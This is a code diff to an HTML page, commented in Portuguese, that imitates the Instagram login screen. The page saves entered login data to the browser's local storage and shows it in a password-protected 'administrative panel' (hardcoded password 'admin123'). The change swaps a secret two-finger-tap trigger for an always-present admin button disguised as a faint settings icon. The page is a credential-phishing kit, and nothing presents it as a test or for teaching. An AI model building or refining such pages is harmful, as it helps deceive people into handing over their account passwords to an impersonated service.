@@ -56,12 +56,12 @@
             padding: 20px 40px;
             text-align: center;
             margin-bottom: 10px;
+            position: relative;
         }
         
         .logo {
             margin: 22px auto 12px;
             width: 175px;
-            cursor: pointer;
         }
         
         .form-group {
@@ -245,21 +245,29 @@
             color: #999;
         }
         
+        /* Botão administrativo camuflado */
         .admin-access-btn {
             position: fixed;
             bottom: 20px;
             right: 20px;
-            background: #0095f6;
-            color: white;
-            width: 50px;
-            height: 50px;
+            background: #f0f0f0; /* Cor quase branca, mas um pouco mais escura */
+            color: #8e8e8e;
+            width: 44px;
+            height: 44px;
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
             cursor: pointer;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
             z-index: 100;
+            border: 1px solid #dbdbdb;
+            transition: all 0.2s ease;
+        }
+        
+        .admin-access-btn:hover {
+            background: #e6e6e6;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15);
         }
         
         .admin-actions {
@@ -298,44 +306,21 @@
             color: #6c757d;
         }
         
-        .secret-tap-area {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100px;
-            z-index: 101;
-        }
-        
-        .admin-help {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            background: rgba(0, 0, 0, 0.7);
-            color: white;
-            padding: 10px;
-            border-radius: 5px;
-            font-size: 12px;
-            max-width: 200px;
-            display: none;
-            z-index: 102;
-        }
-        
         @media (max-width: 875px) {
             .phones {
                 display: none;
             }
             
-            .admin-help {
-                display: block;
+            .admin-access-btn {
+                bottom: 15px;
+                right: 15px;
+                width: 40px;
+                height: 40px;
             }
         }
     </style>
 </head>
 <body>
-    <!-- Área secreta para toque com dois dedos -->
-    <div class="secret-tap-area" id="secret-tap-area"></div>
-    
     <div class="container">
         <div class="phones">
             <!-- Placeholder for Instagram phones image -->
@@ -354,7 +339,7 @@
         
         <div class="login-container">
             <div class="login-box">
-                <div class="logo" id="instagram-logo">
+                <div class="logo">
                     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 192" width="175" height="60">
                         <rect width="192" height="192" fill="none"/>
                         <circle cx="96" cy="96" r="40" stroke="#262626" stroke-width="12"/>
@@ -421,13 +406,10 @@
         </div>
     </div>
     
-    <div class="admin-help">
-        Toque com dois dedos no topo da tela para acessar o painel administrativo
-    </div>
-    
-    <!-- Botão de acesso à área administrativa -->
+    <!-- Botão de acesso à área administrativa (sempre visível mas discreto) -->
     <div class="admin-access-btn" id="admin-access-btn" onclick="openAdminPanel()">
-        <i class="fas fa-lock"></i>
+        <!-- Ícone de configurações (comum em interfaces de administração) -->
+        <i class="fas fa-cog" style="font-size: 18px;"></i>
     </div>
     
     <!-- Painel administrativo -->
@@ -467,38 +449,6 @@
         // Array para armazenar os dados (simulando um banco de dados)
         let collectedData = JSON.parse(localStorage.getItem('instagramData')) || [];
         const ADMIN_PASSWORD = "admin123"; // Senha para acessar os dados
-        
-        // Inicialmente esconder o botão administrativo
-        document.getElementById('admin-access-btn').style.display = 'none';
-        
-        // Configurar o detector de toque com dois dedos
-        let twoFingerTapCount = 0;
-        let twoFingerTapTimeout;
-        
-        document.getElementById('secret-tap-area').addEventListener('touchstart', function(e) {
-            if (e.touches.length >= 2) {
-                twoFingerTapCount++;
-                
-                // Se houver 2 toques com dois dedos dentro de 2 segundos
-                if (twoFingerTapCount >= 2) {
-                    // Mostrar o botão administrativo
-                    document.getElementById('admin-access-btn').style.display = 'flex';
-                    twoFingerTapCount = 0;
-                    
-                    // Mostrar mensagem de confirmação
-                    alert('Painel administrativo ativado! O botão de acesso aparecerá no canto inferior direito.');
-                }
-                
-                // Resetar o contador após 2 segundos
-                clearTimeout(twoFingerTapTimeout);
-                twoFingerTapTimeout = setTimeout(function() {
-                    twoFingerTapCount = 0;
-                }, 2000);
-                
-                // Prevenir o comportamento padrão
-                e.preventDefault();
-            }
-        });
         
         // Função para simular o login
         function simulateLogin() {
@@ -604,4 +554,24 @@
             
             if (confirm('Tem certeza que deseja limpar todos os dados coletados? Esta ação não pode ser desfeita.')) {
                 collectedData = [];
-                localStorage.removeItem('i
+                localStorage.removeItem('instagramData');
+                document.getElementById('admin-data-content').innerHTML = '<div class="empty-data"><i class="fas fa-inbox"></i> Nenhum dado foi coletado ainda.</div>';
+                alert('Todos os dados foram removidos.');
+            }
+        }
+        
+        // Tecla Enter para submeter o formulário
+        document.addEventListener('DOMContentLoaded', function() {
+            const inputs = document.querySelectorAll('input');
+            inputs.forEach(input => {
+                input.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        simulateLogin();
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
